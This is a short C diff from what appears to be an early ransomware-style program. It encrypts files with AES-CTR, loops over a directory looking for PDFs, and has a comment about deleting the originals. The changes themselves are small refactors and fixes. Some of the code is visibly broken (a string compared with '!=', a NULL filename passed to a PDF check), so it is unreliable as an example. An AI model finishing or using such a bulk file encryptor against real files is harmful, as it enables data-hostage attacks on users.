@@ -20,12 +20,6 @@
 #define BUFSIZE 1024 //increase this?
 #define HASH_BUFSIZE 256
 
-void cleanup(Struct *mats, FILE *infile, FILE *outfile, int rc){
-    free(mats);
-    fclose(infile);
-    fclose(outfile);
-    exit(rc);
-}
 
 struct materials {
     const char* key;
@@ -34,6 +28,16 @@ struct materials {
 };
 
 typedef struct materials Struct;
+
+void cleanup(Struct *mats, FILE *infile, FILE *outfile, int rc){
+    free(mats);
+    fclose(infile);
+    fclose(outfile);
+    exit(rc);
+}
+
+
+
 
 // Generate Key
 Struct Gin(){
@@ -65,7 +69,7 @@ Struct Gin(){
 
 
 // AES-CTR
-void inkripshun(FILE *infile, Struct *mats){
+int inkripshun(FILE *infile, Struct *mats){
 
     printf("In inkripshun");
     FILE *outfile;
@@ -170,7 +174,8 @@ void inkripshun(FILE *infile, Struct *mats){
     EVP_CIPHER_CTX_cleanup(ctx);
 
     // Delete original file?  
-
+    // Have to return an int
+    return 0;
 };
 
 
@@ -199,7 +204,7 @@ int main(){
 
     if (directoryPath != "Not Found") {
         // Loop through files in directory
-         nextFile = "";
+         nextFile = NULL;
         
         // Check if PDF?
         if (isPDF(nextFile)){
